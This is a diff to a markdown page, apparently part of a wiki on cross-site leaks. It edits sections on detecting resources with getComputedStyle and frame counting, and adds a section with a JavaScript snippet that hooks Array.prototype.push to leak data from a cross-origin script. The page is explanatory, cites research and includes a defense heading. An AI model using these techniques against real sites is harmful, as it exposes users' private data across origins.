@@ -65,7 +65,7 @@ async function isType(url, type = "script") {
 ```
 
 ## Abusing getComputedStyle
-getComputedStyle can be used to leak CSS style sheets.
+[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) can be used to leak CSS style sheets.
 This function just checks if there has been a style appled to the body.
 ```javascript
 async function isCSS(url) {
@@ -84,7 +84,6 @@ async function isCSS(url) {
 ## PDF
 There are [Open URL Parameters](https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/pdf_open_parameters.pdf) that allow some control over the content such as `zoom`, `view`, `page`, `toolbar`.  
 For chrome a PDF can be detected using [frame counting]({{< ref "/docs/attacks/frame-counting.md" >}}) because an `embed` is used internally.
-However there will be false positives if the page has other embeds.
 ```javascript
 async function isPDF(url) {
     let w = open(url);
@@ -94,6 +93,22 @@ async function isPDF(url) {
     return result;
 }
 ```
+{{< hint warning  >}} There will be false positives if the page has other embeds.{{< /hint >}}
+
+## Script tag
+Leaks the contents of a cross origin script during execution.  
+The contents of a function can be leaked using `.toString()` and variables may also be assigned to the `window`.  
+Even if the data is not acessible from the window its still possible to hook a function that it uses.  
+```javascript
+let hook = window.Array.prototype.push;
+window.Array.prototype.push = function() {
+    console.log(this);
+    return hook.apply(this, arguments);
+}
+```
+{{< hint tip >}} A paper was made using this attack [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) {{< /hint >}}
+
+
 
 ## Defense
 
